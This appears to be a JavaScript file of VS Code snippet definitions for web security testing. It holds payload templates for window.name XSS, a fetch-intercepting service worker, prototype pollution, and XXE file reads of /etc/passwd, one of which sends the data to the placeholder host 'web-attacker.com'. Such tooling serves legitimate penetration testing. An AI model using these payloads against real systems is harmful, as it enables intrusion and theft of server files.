// https://code.visualstudio.com/docs/editing/userdefinedsnippets
export const SNIPPETS = {
  html: {
    '!name-xss': {
      description: 'Create a window.name redirect XSS template',
      code: `<script>
  name = "alert(origin)"
  location = "https://\${1:example.com/?payload=eval(name)}"$0
</script>`
    },
    onclick: {
      description: '<script> tag with onclick= event handler',
      code: `<script>
  onclick = () => {
    $0
  }
</script>`
    }
  },
  javascript: {
    '!sw': {
      description: 'Service Worker fetch intercept',
      code: `self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));

self.addEventListener('fetch', (e) => {
  console.log('Intercepted fetch for', e.request.url);
  $0
  
  e.respondWith(new Response('<script>alert(origin)<\\/script>', {
    headers: { 'Content-Type': 'text/html' }
  }));
});`
    }
  },
  json: {
    '!proto': {
      description: 'Insert a __proto__ and prototype.constructor property',
      code: `"__proto__": {
  "$1": $2
},
"constructor": {
  "prototype": {
    "$1": $2
  }
}$0`
    }
  },
  xml: {
    html: {
      description: 'Embed HTML inside SVG via <foreignObject>, in the HTML namespace',
      code: `<foreignObject x="0" y="0" width="100%" height="100%">
  <html xmlns="http://www.w3.org/1999/xhtml">
    $0
  </html>
</foreignObject>`
    },
    '!xxe-oob': {
      description: 'Insert an Out-Of-Band XXE file read payload (DTD)',
      code: `<!ENTITY % file SYSTEM "file://$\{1:/etc/passwd}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://\${2:web-attacker.com}/?%file;'>">
%eval;
%exfiltrate;`
    },
    '!xxe-error': {
      description: 'Insert an error-based XXE file read payload (DTD)',
      code: `<!ENTITY % file SYSTEM "file://$\{1:/etc/passwd}">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;`
    }
  },
  css: {
    '!poc': {
      description: 'visual Proof of Concept: color everything red/blue',
      code: `* {
  color: red !important;
  background-color: blue !important;
}`
    }
  }
}
